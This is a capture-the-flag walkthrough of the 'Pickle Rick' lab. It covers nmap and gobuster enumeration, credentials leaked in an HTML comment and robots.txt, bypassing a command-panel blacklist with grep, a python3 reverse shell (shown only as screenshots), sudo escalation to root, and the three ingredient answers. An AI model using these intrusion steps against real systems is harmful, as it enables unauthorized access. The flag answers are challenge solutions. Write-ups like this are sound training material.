# Overview
![overview](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/f67c7a7c-6787-46f3-859d-8bb653caa7eb)


# Question-1
```
What is the first ingredient that Rick needs?
```
- Let start by scanning the IP Address `10.10.54.104` with Nmap
### Nmap Results
```bash
┌──(kali㉿kali)-[~]
└─$  nmap -A 10.10.54.104       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 08:46 EST
Nmap scan report for 10.10.54.104
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:d1:f5:44:fc:f9:82:e6:94:df:f6:bf:4f:97:0b:62 (RSA)
|   256 29:7f:d0:f1:28:c5:cc:c8:0c:d5:0f:dd:fa:7e:83:2e (ECDSA)
|_  256 5b:00:f3:24:7a:0e:45:39:42:a8:fe:99:75:09:e5:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.43 seconds
```

From the scan result i see a web server is running i.e`port 80` . Let check it out:
![webcheck](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/9762c829-963e-4d8a-8959-30a2a6dd5021)

There is nothing interesting on the web page so i decide to check the page source:
![webchecksrc](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/0c53bc52-019b-488d-a6de-cfef08c6774d)

and Boom i got a very important information(a username) from the HTML comment:
```html
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

Then i decided to brute-force for directories using gobuster and i also added some extension switch to the command:
### Gobuster result
```bash
┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]
└─$ gobuster dir -u http://10.10.54.104 -w directory-list-2.3-medium.txt -x txt,html,css,cgi,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.54.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,cgi,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 292]
/.php                 (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.54.104/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```
from the output, what i see that robot.txt is available so i use the browser to check if there is any disallow entries:
![robots](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/3aa58445-eff9-4fc0-a74a-94cde2ada7a2)

this is strange robots.txt doesn't contain a string like this, but i note my findings:
```
Wubbalubbadubdub
```

from the Gobuster output we also have a login page i.e `login.php` :
![login1](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/3efac5e6-053c-43e3-9c61-c76ca83ff4ac)

because i have no other info and the rest of the pages need a user to be logged in before viewing them i tried the username i got earlier and the string i found from`robots.txt` as the password because there is No harm in trying ): 
![login2](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/bfc50816-b25f-4c6e-9405-87545e4e43b9)

Boom i am logged in and i was brought to a command panel page(hopefully get RCE or a reverse shell?) i don't know ):
and also i don't have access to other pages, only the command page is available for us:
![denied](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/185d67be-2b10-43e3-90f4-80316d4c7701)

typing `ls` in the command panel prompt i got the list of files and directory in the current web-root file path `/var/www/html`
![ls](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/374a3a6c-10a3-4ecd-b60a-db490a79f916)

then i try to read the first file `Sup3rS3cretPickl3Ingred.txt` but it not working, i use different method of reading file but i am getting same error message, it seems like there is list of commands that can't be executed `blacklist`:
![noread](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/b7f66bbb-84e0-4ee8-93c2-b2c06f9f05bb)

i researched for possible ways to read a file, and found Grep `grep . example.txt` and `grep -R .` :
i used the first grep method to read the the `Sup3rS3cretPickl3Ingred.txt` and i was able to see the first answer(ingredient)
![ingredient1](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/32c61762-e7a7-4a9a-bd54-a7ddcad598ea)

```bash
command: grep . Sup3rS3cretPickl3Ingred.txt

output: mr. meeseek hair
```

i also used the second method of reading files with grep but it returned back the out of all the file `ALL`
![all](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/c6060714-c1d1-4658-9e24-df7cd76d107c)

it doesn't look nice to read but viewing the page source is much better
![clue](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/d0aafb95-e1ab-4b62-925b-9f58a9184827)

from the output of clue.txt `Look around the file system for the other ingredient.`
it will be hard to do that with the limited executable commands.
but scrolling down the source page i found the php code that is actively disallowing some command:
![blacklist](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/94d80100-2392-460e-8cc8-860be5ee3669)

and the list of commands isn't that big so i can work with this.
# Getting a reverse shell
going to [Online-Reverse shell generator](https://www.revshells.com/) i used different payloads but the one that worked is the python3 payload
![payload](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/6a2e85d8-2621-4cda-b399-0ca9a6d08de4)

![id](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/4f6ee430-3801-45a0-b154-070e6a47bc73)

# Mini-privilege Escalation
running sudo -l and noticed that www-data can run anything with sudo:
![su](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/f756886b-0780-44a0-8a74-994f447e434b)

then i switched to root with `sudo su` and found the 3rd ingredient in `/root`
![ingredient3](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/d9dba17e-a9d2-4344-91e7-d56c0f345292)

```bash
www-data@ip-10-10-54-104:/var/www/html$ sudo su
sudo su
root@ip-10-10-54-104:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-54-104:/var/www/html# cd /root
cd /root
root@ip-10-10-54-104:~# ls
ls
3rd.txt  snap
root@ip-10-10-54-104:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice <--- 
root@ip-10-10-54-104:~# 
```
lastly i moved to the /`home/rick` directory and found the second ingredient:
![ingredient2](https://github.com/Hassans-Sec/Hassans-sec.github.io/assets/139691745/f52eabb1-5017-4942-b107-8dbf24f59931)

```bash
root@ip-10-10-54-104:~# cd /home
cd /home
root@ip-10-10-54-104:/home# ls
ls
rick  ubuntu
root@ip-10-10-54-104:/home# cd rick
cd rick
root@ip-10-10-54-104:/home/rick# ls
ls
second ingredients
root@ip-10-10-54-104:/home/rick# cat second\ ingredinets
cat second\ ingredinets
cat: 'second ingredinets': No such file or directory
root@ip-10-10-54-104:/home/rick# cat *
cat *
1 jerry tear <---
root@ip-10-10-54-104:/home/rick# 
```

===**And that all, isn't this fun?** === 

